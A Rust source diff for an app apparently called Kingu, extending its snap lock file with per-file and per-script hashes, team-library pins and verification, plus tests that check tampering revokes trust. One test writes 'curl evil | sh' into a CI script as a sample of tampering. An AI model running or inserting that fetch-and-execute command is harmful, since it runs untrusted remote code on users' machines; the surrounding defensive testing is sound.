@@ -15,6 +15,7 @@
 //! `{ "version": 1, "snaps": [{ "id", "version", "sha256" }] }`. A repo snap that differs from its
 //! entry is flagged in the Snaps view; trust is still required separately.
 
+use std::collections::BTreeMap;
 use std::path::{Path, PathBuf};
 use std::sync::Mutex;
 use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
@@ -25,7 +26,7 @@ use tauri::{AppHandle, Manager};
 
 use crate::i18n::msg::SnapMsg;
 use crate::settings::write_atomic;
-use crate::snap::{MANIFEST, MAX_MANIFEST_BYTES, REPO_DIR, Source, SnapInfo, TrustData, USER_DIR, config_dir, is_snap_id, read_snap, repo_snaps_dir, scan};
+use crate::snap::{MANIFEST, MAX_MANIFEST_BYTES, Permissions, REPO_DIR, Source, SnapInfo, TrustData, USER_DIR, config_dir, is_snap_id, read_snap, repo_snaps_dir, scan};
 use crate::tr;
 use crate::workspace::Workspace;
 
@@ -67,14 +68,26 @@ pub struct Origin {
   pub commit: Option<String>,
   #[serde(default)]
   pub path: Option<String>,
+  /// Installed from the team library: which server and published version.
+  #[serde(default, skip_serializing_if = "Option::is_none")]
+  pub team: Option<TeamOrigin>,
   #[serde(default)]
   pub installed_at: u64,
+}
+
+/// A team library install: the (normalized) server URL and the published version.
+#[derive(Serialize, Deserialize, Clone, Debug, PartialEq, Default)]
+pub struct TeamOrigin {
+  pub server: String,
+  pub version: String,
 }
 
 impl Origin {
   /// Replacing an installed snap is allowed only from the same place it came from.
   fn same_source(&self, other: &Origin) -> bool {
-    matches!((&self.url, &other.url), (Some(a), Some(b)) if a == b) || matches!((&self.path, &other.path), (Some(a), Some(b)) if a == b)
+    matches!((&self.url, &other.url), (Some(a), Some(b)) if a == b)
+      || matches!((&self.path, &other.path), (Some(a), Some(b)) if a == b)
+      || matches!((&self.team, &other.team), (Some(a), Some(b)) if a.server == b.server)
   }
 }
 
@@ -310,7 +323,7 @@ fn new_stage(staging: &Path) -> Result<(String, PathBuf), String> {
 }
 
 /// Validates the staged `src`, records the origin next to it and lists the candidates.
-fn finish_stage(token: String, dir: &Path, origin: Origin, user_dir: &Path) -> Result<Prepared, String> {
+pub(crate) fn finish_stage(token: String, dir: &Path, origin: Origin, user_dir: &Path) -> Result<Prepared, String> {
   let src = dir.join("src");
   files_of(&src)?;
   let candidates = candidates(&src)?;
@@ -326,7 +339,7 @@ fn finish_stage(token: String, dir: &Path, origin: Origin, user_dir: &Path) -> R
 }
 
 /// Runs `f` on a fresh staging folder; the folder is removed when it fails.
-fn staged(staging: &Path, f: impl FnOnce(&str, &Path) -> Result<Prepared, String>) -> Result<Prepared, String> {
+pub(crate) fn staged(staging: &Path, f: impl FnOnce(&str, &Path) -> Result<Prepared, String>) -> Result<Prepared, String> {
   let (token, dir) = new_stage(staging)?;
   let result = f(&token, &dir);
   if result.is_err() {
@@ -367,7 +380,7 @@ pub(crate) fn clone(dir: &Path, spec: &GitSpec, timeout: Duration) -> Result<Str
 fn prepare_spec(staging: &Path, user_dir: &Path, spec: &GitSpec, timeout: Duration) -> Result<Prepared, String> {
   staged(staging, |token, dir| {
     let commit = clone(dir, spec, timeout)?;
-    let origin = Origin { url: Some(spec.url.clone()), git_ref: spec.git_ref.clone(), commit: Some(commit), path: None, installed_at: 0 };
+    let origin = Origin { url: Some(spec.url.clone()), git_ref: spec.git_ref.clone(), commit: Some(commit), path: None, team: None, installed_at: 0 };
     finish_stage(token.to_string(), dir, origin, user_dir)
   })
 }
@@ -474,7 +487,7 @@ pub fn prepare_pinned(staging: &Path, user_dir: &Path, pin: &Pin, timeout: Durat
   let spec = GitSpec { git_ref: pin.git_ref.clone(), ..spec };
   let mut p = staged(staging, |token, dir| {
     fetch_commit(dir, &spec, &pin.commit, timeout)?;
-    let origin = Origin { url: Some(spec.url.clone()), git_ref: spec.git_ref.clone(), commit: Some(pin.commit.clone()), path: None, installed_at: 0 };
+    let origin = Origin { url: Some(spec.url.clone()), git_ref: spec.git_ref.clone(), commit: Some(pin.commit.clone()), path: None, team: None, installed_at: 0 };
     finish_stage(token.to_string(), dir, origin, user_dir)
   })?;
   p.candidates.retain(|c| c.snap.id == pin.id);
@@ -718,12 +731,57 @@ pub fn create(base: &Path, id: &str, name: &str) -> Result<PathBuf, String> {
 // ---------------------------------------------------------------------------------------------
 // Lock file
 
+/// Where a locked snap lives: the repo's `.kingu/snaps` (the default), or the team library
+/// (installed as a user snap; the lock says which published version the project expects).
+#[derive(Serialize, Deserialize, Clone, Copy, Debug, PartialEq, Default)]
+#[serde(rename_all = "lowercase")]
+pub enum LockSource {
+  #[default]
+  Repo,
+  Team,
+}
+
+fn is_repo(s: &LockSource) -> bool {
+  *s == LockSource::Repo
+}
+
+/// One pinned snap. `sha256` is the trust hash (`SnapInfo::hash`); `files` and `scripts` hold
+/// each covered file's own SHA-256 (`snap.toml` included), so a mismatch names what changed.
 #[derive(Serialize, Deserialize, Clone, Debug, PartialEq)]
 pub struct LockEntry {
   pub id: String,
   pub version: String,
   pub sha256: String,
+  #[serde(default, skip_serializing_if = "is_repo")]
+  pub source: LockSource,
+  #[serde(default, skip_serializing_if = "Option::is_none")]
+  pub permissions: Option<Permissions>,
+  #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
+  pub files: BTreeMap<String, String>,
+  #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
+  pub scripts: BTreeMap<String, String>,
 }
+
+impl LockEntry {
+  pub fn of(snap: &SnapInfo, source: LockSource) -> Self {
+    let mut files: BTreeMap<String, String> = snap.files.iter().map(|f| (f.path.clone(), f.sha256.clone())).collect();
+    if !snap.manifest_sha256.is_empty() {
+      files.insert(MANIFEST.to_string(), snap.manifest_sha256.clone());
+    }
+    Self {
+      id: snap.id.clone(),
+      version: snap.version.clone(),
+      sha256: snap.hash.clone(),
+      source,
+      permissions: Some(snap.permissions.clone()),
+      files,
+      scripts: snap.scripts.iter().map(|f| (f.path.clone(), f.sha256.clone())).collect(),
+    }
+  }
+}
+
+/// Version 2 adds `source`, `permissions`, `files` and `scripts`; version 1 files still read.
+pub const LOCK_VERSION: u32 = 2;
 
 #[derive(Serialize, Deserialize, Debug, PartialEq, Default)]
 pub struct Lock {
@@ -732,7 +790,7 @@ pub struct Lock {
   pub snaps: Vec<LockEntry>,
 }
 
-/// A repo snap against `.kingu/snaps.lock`: same version and hash, different, or not listed.
+/// A snap against `.kingu/snaps.lock`: same version and hash, different, or not listed.
 #[derive(Serialize, Clone, Copy, Debug, PartialEq)]
 #[serde(rename_all = "lowercase")]
 pub enum LockStatus {
@@ -742,12 +800,44 @@ pub enum LockStatus {
 }
 
 impl Lock {
+  fn find(&self, id: &str, source: LockSource) -> Option<&LockEntry> {
+    self.snaps.iter().find(|e| e.id == id && e.source == source)
+  }
+
+  /// The repo snap's entry.
+  pub fn entry(&self, id: &str) -> Option<&LockEntry> {
+    self.find(id, LockSource::Repo)
+  }
+
+  /// The team snap's entry.
+  pub fn team_entry(&self, id: &str) -> Option<&LockEntry> {
+    self.find(id, LockSource::Team)
+  }
+
+  fn matches(e: &LockEntry, snap: &SnapInfo) -> bool {
+    e.sha256 == snap.hash && e.version == snap.version && snap.error.is_none()
+  }
+
+  /// A repo snap against its entry.
   pub fn status(&self, snap: &SnapInfo) -> LockStatus {
-    match self.snaps.iter().find(|e| e.id == snap.id) {
+    match self.entry(&snap.id) {
       None => LockStatus::Unlocked,
-      Some(e) if e.sha256 == snap.hash && e.version == snap.version && snap.error.is_none() => LockStatus::Locked,
+      Some(e) if Self::matches(e, snap) => LockStatus::Locked,
       Some(_) => LockStatus::Changed,
     }
+  }
+
+  /// An installed user snap against a team entry with its id; None when the lock has none.
+  pub fn team_status(&self, snap: &SnapInfo) -> Option<LockStatus> {
+    let e = self.team_entry(&snap.id)?;
+    Some(if Self::matches(e, snap) { LockStatus::Locked } else { LockStatus::Changed })
+  }
+
+  /// Adds or replaces the entry with the same id and source; entries stay sorted by id.
+  pub fn upsert(&mut self, entry: LockEntry) {
+    self.snaps.retain(|e| !(e.id == entry.id && e.source == entry.source));
+    self.snaps.push(entry);
+    self.snaps.sort_by(|a, b| (a.id.as_str(), !is_repo(&a.source)).cmp(&(b.id.as_str(), !is_repo(&b.source))));
   }
 }
 
@@ -758,33 +848,154 @@ fn lock_path(root: &Path) -> Option<PathBuf> {
   (!meta.file_type().is_symlink() && meta.is_dir()).then(|| kingu.join(LOCK_FILE))
 }
 
-/// The folder's lock, `None` when there is none (or it is a symlink, too big or corrupt).
+/// The folder's lock, `None` when there is none (or it is a symlink, too big, corrupt or newer
+/// than this version understands).
 pub fn read_lock(root: &Path) -> Option<Lock> {
   let file = lock_path(root)?;
   let meta = std::fs::symlink_metadata(&file).ok()?;
-  if !meta.is_file() || meta.len() > 1024 * 1024 {
+  if !meta.is_file() || meta.len() > 4 * 1024 * 1024 {
     return None;
   }
-  serde_json::from_slice(&std::fs::read(file).ok()?).ok()
+  let lock: Lock = serde_json::from_slice(&std::fs::read(file).ok()?).ok()?;
+  (lock.version >= 1 && lock.version <= LOCK_VERSION).then_some(lock)
 }
 
-/// Writes the lock for the valid repo snaps in `list`; returns how many it pins.
-pub fn write_lock(root: &Path, list: &[SnapInfo]) -> Result<usize, String> {
-  repo_snaps_dir(root).ok_or_else(|| tr!(SnapMsg::NoRepoSnaps))?;
+fn save_lock(root: &Path, mut lock: Lock) -> Result<(), String> {
   let file = lock_path(root).ok_or_else(|| tr!(SnapMsg::KinguNotFolder))?;
   if std::fs::symlink_metadata(&file).is_ok_and(|m| !m.is_file()) {
     return Err(tr!(SnapMsg::NotPlainFile, path = file.display()));
   }
-  let mut snaps: Vec<LockEntry> = list
-    .iter()
-    .filter(|s| s.source == Source::Repo && s.error.is_none())
-    .map(|s| LockEntry { id: s.id.clone(), version: s.version.clone(), sha256: s.hash.clone() })
-    .collect();
-  snaps.sort_by(|a, b| a.id.cmp(&b.id));
-  let count = snaps.len();
-  let text = serde_json::to_string_pretty(&Lock { version: 1, snaps }).map_err(|e| e.to_string())?;
-  write_atomic(&file, &(text + "\n")).map_err(|e| tr!(SnapMsg::WriteFailed, path = LOCK_FILE, detail = e))?;
-  Ok(count)
+  lock.version = LOCK_VERSION;
+  let text = serde_json::to_string_pretty(&lock).map_err(|e| e.to_string())?;
+  write_atomic(&file, &(text + "\n")).map_err(|e| tr!(SnapMsg::WriteFailed, path = LOCK_FILE, detail = e))
+}
+
+/// Serializes read-modify-write of lock files.
+static LOCK_FILE_LOCK: Mutex<()> = Mutex::new(());
+
+/// The lock as it is, or an empty one to add to.
+fn lock_or_new(root: &Path) -> Lock {
+  read_lock(root).unwrap_or(Lock { version: LOCK_VERSION, snaps: Vec::new() })
+}
+
+/// Writes the lock for the valid repo snaps in `list` (team entries already there are kept);
+/// returns how many repo snaps it pins.
+pub fn write_lock(root: &Path, list: &[SnapInfo]) -> Result<usize, String> {
+  repo_snaps_dir(root).ok_or_else(|| tr!(SnapMsg::NoRepoSnaps))?;
+  lock_path(root).ok_or_else(|| tr!(SnapMsg::KinguNotFolder))?;
+  let _guard = LOCK_FILE_LOCK.lock().unwrap_or_else(|e| e.into_inner());
+  let mut lock = lock_or_new(root);
+  lock.snaps.retain(|e| e.source == LockSource::Team);
+  let repo: Vec<&SnapInfo> = list.iter().filter(|s| s.source == Source::Repo && s.error.is_none()).collect();
+  for s in &repo {
+    lock.upsert(LockEntry::of(s, LockSource::Repo));
+  }
+  save_lock(root, lock)?;
+  Ok(repo.len())
+}
+
+/// Re-approves repo snap `id` as it is now (`hash` is what the user was shown): its lock entry
+/// is replaced and it is trusted, so the next listing has it locked and active again.
+pub fn approve_locked(config_dir: &Path, root: &Path, list: &[SnapInfo], id: &str, hash: &str) -> Result<(), String> {
+  let snap = list.iter().find(|s| s.source == Source::Repo && s.id == id).ok_or_else(|| tr!(SnapMsg::NotFoundHere, id))?;
+  if let Some(e) = &snap.error {
+    return Err(tr!(SnapMsg::TrustBroken, id, detail = e));
+  }
+  if snap.hash != hash {
+    return Err(tr!(SnapMsg::TrustChanged, manifest = MANIFEST, id));
+  }
+  {
+    let _guard = LOCK_FILE_LOCK.lock().unwrap_or_else(|e| e.into_inner());
+    let mut lock = lock_or_new(root);
+    lock.upsert(LockEntry::of(snap, LockSource::Repo));
+    save_lock(root, lock)?;
+  }
+  crate::snap::set_trust(config_dir, root, id, true, Some(hash))
+}
+
+/// Pins installed user snap `id` (installed from the team library) in the folder's lock.
+pub fn pin_team(root: &Path, list: &[SnapInfo], id: &str) -> Result<(), String> {
+  let snap = list.iter().find(|s| s.source == Source::User && s.id == id).ok_or_else(|| tr!(SnapMsg::NotInUserSnaps, id))?;
+  if let Some(e) = &snap.error {
+    return Err(tr!(SnapMsg::InstallBroken, id, detail = e));
+  }
+  if snap.origin.as_ref().and_then(|o| o.team.as_ref()).is_none() {
+    return Err(tr!(SnapMsg::NotFromTeamLibrary, id));
+  }
+  lock_path(root).ok_or_else(|| tr!(SnapMsg::KinguNotFolder))?;
+  let _guard = LOCK_FILE_LOCK.lock().unwrap_or_else(|e| e.into_inner());
+  let mut lock = lock_or_new(root);
+  lock.upsert(LockEntry::of(snap, LockSource::Team));
+  save_lock(root, lock)
+}
+
+/// `snap_lock_verify`: one row per lock entry, then one per repo snap the lock lacks.
+#[derive(Serialize, Debug, PartialEq)]
+#[serde(rename_all = "camelCase")]
+pub struct LockReport {
+  pub id: String,
+  pub source: LockSource,
+  /// `locked`, `changed`, `unlocked` (a repo snap the lock lacks) or `missing` (pinned, not here).
+  pub status: String,
+  pub locked_version: Option<String>,
+  pub version: Option<String>,
+  /// Files of the snap and repo scripts added, removed or changed since the lock was written
+  /// (empty for a version-1 entry, which has no per-file hashes).
+  pub files: Vec<String>,
+  pub scripts: Vec<String>,
+  pub locked_permissions: Option<Permissions>,
+  pub permissions: Option<Permissions>,
+}
+
+fn changed_paths(locked: &BTreeMap<String, String>, now: &BTreeMap<String, String>) -> Vec<String> {
+  let mut out: Vec<String> = locked.iter().filter(|(k, v)| now.get(*k) != Some(*v)).map(|(k, _)| k.clone()).collect();
+  out.extend(now.keys().filter(|k| !locked.contains_key(*k)).cloned());
+  out.sort();
+  out
+}
+
+pub fn verify_lock(lock: &Lock, list: &[SnapInfo]) -> Vec<LockReport> {
+  let mut out = Vec::new();
+  for e in &lock.snaps {
+    let want = if e.source == LockSource::Team { Source::User } else { Source::Repo };
+    let report = |status: &str, snap: Option<&SnapInfo>, files: Vec<String>, scripts: Vec<String>| LockReport {
+      id: e.id.clone(),
+      source: e.source,
+      status: status.into(),
+      locked_version: Some(e.version.clone()),
+      version: snap.map(|s| s.version.clone()),
+      files,
+      scripts,
+      locked_permissions: e.permissions.clone(),
+      permissions: snap.map(|s| s.permissions.clone()),
+    };
+    let Some(snap) = list.iter().find(|s| s.id == e.id && s.source == want) else {
+      out.push(report("missing", None, Vec::new(), Vec::new()));
+      continue;
+    };
+    if Lock::matches(e, snap) {
+      out.push(report("locked", Some(snap), Vec::new(), Vec::new()));
+    } else if e.files.is_empty() {
+      out.push(report("changed", Some(snap), Vec::new(), Vec::new()));
+    } else {
+      let now = LockEntry::of(snap, e.source);
+      out.push(report("changed", Some(snap), changed_paths(&e.files, &now.files), changed_paths(&e.scripts, &now.scripts)));
+    }
+  }
+  for s in list.iter().filter(|s| s.source == Source::Repo && s.error.is_none() && lock.entry(&s.id).is_none()) {
+    out.push(LockReport {
+      id: s.id.clone(),
+      source: LockSource::Repo,
+      status: "unlocked".into(),
+      locked_version: None,
+      version: Some(s.version.clone()),
+      files: Vec::new(),
+      scripts: Vec::new(),
+      locked_permissions: None,
+      permissions: Some(s.permissions.clone()),
+    });
+  }
+  out
 }
 
 // ---------------------------------------------------------------------------------------------
@@ -830,11 +1041,11 @@ pub async fn snap_catalog(app: AppHandle) -> Result<Vec<SnapInfo>, String> {
 #[tauri::command]
 pub async fn snap_install_builtin(app: AppHandle, id: String) -> Result<Prepared, String> {
   if !is_snap_id(&id) {
-    return Err(format!("id \"{id}\" ไม่ถูกต้อง"));
+    return Err(tr!(SnapMsg::InvalidId, id));
   }
   blocking(move || {
-    let dir = catalog_dir(&app).ok_or("Kingu รุ่นนี้ไม่มี Snap ที่แนะนำ")?.join(&id);
-    let path = dir.to_str().ok_or("path ของ Snap ไม่ใช่ UTF-8")?;
+    let dir = catalog_dir(&app).ok_or_else(|| tr!(SnapMsg::NoRecommended))?.join(&id);
+    let path = dir.to_str().ok_or_else(|| tr!(SnapMsg::SnapPathNotUtf8))?;
     prepare_folder(&staging_dir(&app)?, &user_dir(&app)?, path)
   })
   .await
@@ -891,13 +1102,55 @@ pub fn snap_new(app: AppHandle, ws: Workspace, id: String, name: String, locatio
   }
 }
 
-#[tauri::command]
-pub fn snap_lock(app: AppHandle, ws: Workspace) -> Result<usize, String> {
+/// The open folder and its snaps as listed now.
+fn folder_snaps(app: &AppHandle, ws: &Workspace) -> Result<(PathBuf, PathBuf, Vec<SnapInfo>), String> {
   let root = ws.root().map_err(|_| tr!(SnapMsg::NoFolderOpen))?;
-  let config = config_dir(&app)?;
+  let config = config_dir(app)?;
   let trust = TrustData::load(&config.join(crate::snap::TRUST_FILE));
   let list = crate::snap::discover(&config.join(USER_DIR), Some(&root), &trust);
-  write_lock(&root, &list)
+  Ok((config, root, list))
+}
+
+#[tauri::command]
+pub async fn snap_lock(app: AppHandle, ws: Workspace) -> Result<usize, String> {
+  blocking(move || {
+    let (_, root, list) = folder_snaps(&app, &ws)?;
+    write_lock(&root, &list)
+  })
+  .await
+}
+
+/// Every lock entry against what the folder (and the user snaps) hold now.
+#[tauri::command]
+pub async fn snap_lock_verify(app: AppHandle, ws: Workspace) -> Result<Vec<LockReport>, String> {
+  blocking(move || {
+    let (_, root, list) = folder_snaps(&app, &ws)?;
+    let lock = read_lock(&root).ok_or_else(|| tr!(SnapMsg::NoLockFile))?;
+    Ok(verify_lock(&lock, &list))
+  })
+  .await
+}
+
+/// Re-approves a repo snap that differs from the lock: updates its entry and trusts it.
+#[tauri::command]
+pub async fn snap_lock_approve(app: AppHandle, ws: Workspace, id: String, hash: String) -> Result<(), String> {
+  blocking(move || {
+    let (config, root, list) = folder_snaps(&app, &ws)?;
+    approve_locked(&config, &root, &list, &id, &hash)?;
+    log::info!("snap {id}: re-approved and locked in {}", root.display());
+    Ok(())
+  })
+  .await
+}
+
+/// Pins an installed team library snap in the folder's lock.
+#[tauri::command]
+pub async fn snap_lock_pin_team(app: AppHandle, ws: Workspace, id: String) -> Result<(), String> {
+  blocking(move || {
+    let (_, root, list) = folder_snaps(&app, &ws)?;
+    pin_team(&root, &list, &id)
+  })
+  .await
 }
 
 #[tauri::command]
@@ -1335,7 +1588,7 @@ mod tests {
 
     assert_eq!(write_lock(&root, &list).unwrap(), 2);
     let lock = read_lock(&root).unwrap();
-    assert_eq!(lock.version, 1);
+    assert_eq!(lock.version, LOCK_VERSION);
     assert_eq!(lock.snaps.iter().map(|s| s.id.as_str()).collect::<Vec<_>>(), ["a", "b"]);
     let status = |list: &[SnapInfo], id: &str| list.iter().find(|s| s.id == id).unwrap().lock;
     let list = crate::snap::discover(&e.user, Some(&root), &trust);
@@ -1357,5 +1610,150 @@ mod tests {
     std::fs::write(root.join(".kingu/snaps.lock"), "not json").unwrap();
     assert!(read_lock(&root).is_none());
     assert!(write_lock(&e.tmp.path().join("nowhere"), &[]).is_err());
+  }
+
+  /// A repo with `.kingu/snaps/<id>` holding `manifest` plus `files`, and repo-level `extra` files.
+  fn repo_with(root: &Path, id: &str, manifest: &str, files: &[(&str, &str)], extra: &[(&str, &str)]) {
+    let dir = root.join(".kingu/snaps").join(id);
+    std::fs::create_dir_all(&dir).unwrap();
+    std::fs::write(dir.join("snap.toml"), manifest).unwrap();
+    for (rel, text) in files.iter().map(|(r, t)| (dir.join(r), t)).chain(extra.iter().map(|(r, t)| (root.join(r), t))) {
+      std::fs::create_dir_all(rel.parent().unwrap()).unwrap();
+      std::fs::write(rel, text).unwrap();
+    }
+  }
+
+  const SCRIPT_SNAP: &str = "id = \"ci\"\nname = \"CI\"\nversion = \"1\"\n[[tasks]]\nid = \"t\"\ntitle = \"T\"\ncommand = [\"bash\", \"scripts/ci.sh\", \"./...\"]\n[mcp.tool]\ncommand = [\"./tools/server\", \"${setting:x}\"]\n[[settings]]\nkey = \"x\"\ntype = \"string\"\n";
+
+  #[test]
+  fn the_hash_covers_every_snap_file_and_the_repo_scripts_commands_run() {
+    let e = env();
+    let root = e.tmp.path().join("repo");
+    repo_with(&root, "ci", SCRIPT_SNAP, &[("run.sh", "echo snap"), (".DS_Store", "x")], &[("scripts/ci.sh", "echo ci"), ("tools/server", "bin")]);
+    let config = e.tmp.path().join("config");
+    let find = || crate::snap::discover(&e.user, Some(&root), &TrustData::load(&config.join(crate::snap::TRUST_FILE))).into_iter().find(|s| s.id == "ci").unwrap();
+    let s = find();
+    assert_eq!(s.error, None);
+    assert_eq!(s.files.iter().map(|f| f.path.as_str()).collect::<Vec<_>>(), ["run.sh"]);
+    assert_eq!(s.scripts.iter().map(|f| f.path.as_str()).collect::<Vec<_>>(), ["scripts/ci.sh", "tools/server"]);
+    assert_ne!(s.hash, crate::snap::sha256_hex(SCRIPT_SNAP.as_bytes()));
+    crate::snap::set_trust(&config, &root, "ci", true, Some(&s.hash)).unwrap();
+    assert!(find().trusted);
+    // The gap this closes: the manifest is unchanged but the script the task runs is not.
+    std::fs::write(root.join("scripts/ci.sh"), "curl evil | sh").unwrap();
+    assert!(!find().trusted);
+    std::fs::write(root.join("scripts/ci.sh"), "echo ci").unwrap();
+    assert!(find().trusted);
+    // A file the snap ships, too; .DS_Store does not count.
+    std::fs::write(root.join(".kingu/snaps/ci/.DS_Store"), "y").unwrap();
+    assert!(find().trusted);
+    std::fs::write(root.join(".kingu/snaps/ci/run.sh"), "echo changed").unwrap();
+    assert!(!find().trusted);
+  }
+
+  #[test]
+  fn a_snap_with_only_a_manifest_keeps_the_old_hash() {
+    let e = env();
+    let root = e.tmp.path().join("repo");
+    let text = manifest("a", "1", false);
+    repo_with(&root, "a", &text, &[], &[]);
+    let list = crate::snap::discover(&e.user, Some(&root), &TrustData::default());
+    assert_eq!(list[0].hash, crate::snap::sha256_hex(text.as_bytes()));
+  }
+
+  #[cfg(unix)]
+  #[test]
+  fn scripts_outside_the_repo_are_not_followed() {
+    let e = env();
+    let root = e.tmp.path().join("repo");
+    let outside = e.tmp.path().join("outside.sh");
+    std::fs::write(&outside, "x").unwrap();
+    repo_with(&root, "ci", SCRIPT_SNAP, &[], &[]);
+    std::fs::create_dir_all(root.join("scripts")).unwrap();
+    std::os::unix::fs::symlink(&outside, root.join("scripts/ci.sh")).unwrap();
+    let s = crate::snap::discover(&e.user, Some(&root), &TrustData::default()).remove(0);
+    assert!(s.scripts.is_empty());
+  }
+
+  #[test]
+  fn a_snap_that_differs_from_the_lock_is_untrusted_until_re_approved() {
+    let e = env();
+    let root = e.tmp.path().join("repo");
+    let config = e.tmp.path().join("config");
+    repo_with(&root, "ci", SCRIPT_SNAP, &[("run.sh", "echo snap")], &[("scripts/ci.sh", "echo ci")]);
+    let list = || crate::snap::discover(&e.user, Some(&root), &TrustData::load(&config.join(crate::snap::TRUST_FILE)));
+    let ci = |l: Vec<SnapInfo>| l.into_iter().find(|s| s.id == "ci").unwrap();
+    let s = ci(list());
+    crate::snap::set_trust(&config, &root, "ci", true, Some(&s.hash)).unwrap();
+    assert_eq!(write_lock(&root, &list()).unwrap(), 1);
+    let lock = read_lock(&root).unwrap();
+    let entry = lock.entry("ci").unwrap();
+    assert_eq!(entry.files.keys().collect::<Vec<_>>(), ["run.sh", "snap.toml"]);
+    assert_eq!(entry.scripts.keys().collect::<Vec<_>>(), ["scripts/ci.sh"]);
+    assert_eq!(entry.permissions, Some(Permissions::default()));
+    let s = ci(list());
+    assert!(s.trusted && s.lock == Some(LockStatus::Locked));
+
+    // Someone commits a lock pinning other contents: trusted bytes or not, it stops.
+    let mut lock = read_lock(&root).unwrap();
+    lock.snaps[0].sha256 = "0".repeat(64);
+    lock.snaps[0].scripts.insert("scripts/ci.sh".into(), "1".repeat(64));
+    save_lock(&root, lock).unwrap();
+    let s = ci(list());
+    assert!(!s.trusted && s.lock == Some(LockStatus::Changed));
+    let report = verify_lock(&read_lock(&root).unwrap(), &list());
+    assert_eq!(report.len(), 1);
+    assert_eq!((report[0].status.as_str(), report[0].scripts.clone()), ("changed", vec!["scripts/ci.sh".to_string()]));
+    assert!(report[0].files.is_empty());
+
+    // Re-approving needs the hash the user saw, then updates the lock and trusts.
+    assert!(approve_locked(&config, &root, &list(), "ci", &"2".repeat(64)).is_err());
+    approve_locked(&config, &root, &list(), "ci", &s.hash).unwrap();
+    let s = ci(list());
+    assert!(s.trusted && s.lock == Some(LockStatus::Locked));
+    assert_eq!(s.approved_permissions, Some(Permissions::default()));
+  }
+
+  #[test]
+  fn verify_reports_missing_unlocked_and_version_1_entries() {
+    let e = env();
+    let root = e.tmp.path().join("repo");
+    repo_with(&root, "a", &manifest("a", "1", false), &[], &[]);
+    repo_with(&root, "b", &manifest("b", "1", false), &[], &[]);
+    let v1 = format!(r#"{{"version":1,"snaps":[{{"id":"a","version":"0","sha256":"{}"}},{{"id":"gone","version":"1","sha256":"{}"}},{{"id":"t","version":"2","sha256":"{}","source":"team"}}]}}"#, "a".repeat(64), "b".repeat(64), "c".repeat(64));
+    std::fs::write(root.join(".kingu/snaps.lock"), v1).unwrap();
+    let list = crate::snap::discover(&e.user, Some(&root), &TrustData::default());
+    let r = verify_lock(&read_lock(&root).unwrap(), &list);
+    let rows: Vec<(&str, &str)> = r.iter().map(|x| (x.id.as_str(), x.status.as_str())).collect();
+    assert_eq!(rows, [("a", "changed"), ("gone", "missing"), ("t", "missing"), ("b", "unlocked")]);
+    assert_eq!(r[2].source, LockSource::Team);
+    // Writing keeps the team entry and replaces the repo ones.
+    write_lock(&root, &list).unwrap();
+    let lock = read_lock(&root).unwrap();
+    assert_eq!(lock.snaps.iter().map(|x| (x.id.as_str(), x.source)).collect::<Vec<_>>(), [("a", LockSource::Repo), ("b", LockSource::Repo), ("t", LockSource::Team)]);
+    // A lock from a newer Kingu is not misread.
+    std::fs::write(root.join(".kingu/snaps.lock"), r#"{"version":9,"snaps":[]}"#).unwrap();
+    assert!(read_lock(&root).is_none());
+  }
+
+  #[test]
+  fn team_entries_show_on_user_snaps_without_disabling_them() {
+    let e = env();
+    let root = e.tmp.path().join("repo");
+    std::fs::create_dir_all(root.join(".kingu")).unwrap();
+    let dir = e.user.join("t");
+    std::fs::create_dir_all(&dir).unwrap();
+    std::fs::write(dir.join("snap.toml"), manifest("t", "2", false)).unwrap();
+    let list = crate::snap::discover(&e.user, Some(&root), &TrustData::default());
+    assert!(pin_team(&root, &list, "t").unwrap_err().contains("team library"));
+    std::fs::write(dir.join(ORIGIN_FILE), r#"{"team":{"server":"https://team.example","version":"2"},"installed_at":1}"#).unwrap();
+    let list = crate::snap::discover(&e.user, Some(&root), &TrustData::default());
+    pin_team(&root, &list, "t").unwrap();
+    let list = crate::snap::discover(&e.user, Some(&root), &TrustData::default());
+    assert_eq!(list[0].lock, Some(LockStatus::Locked));
+    std::fs::write(dir.join("snap.toml"), manifest("t", "3", false)).unwrap();
+    let list = crate::snap::discover(&e.user, Some(&root), &TrustData::default());
+    assert_eq!(list[0].lock, Some(LockStatus::Changed));
+    assert!(list[0].trusted, "a repo lock never switches off a user's snap");
   }
 }
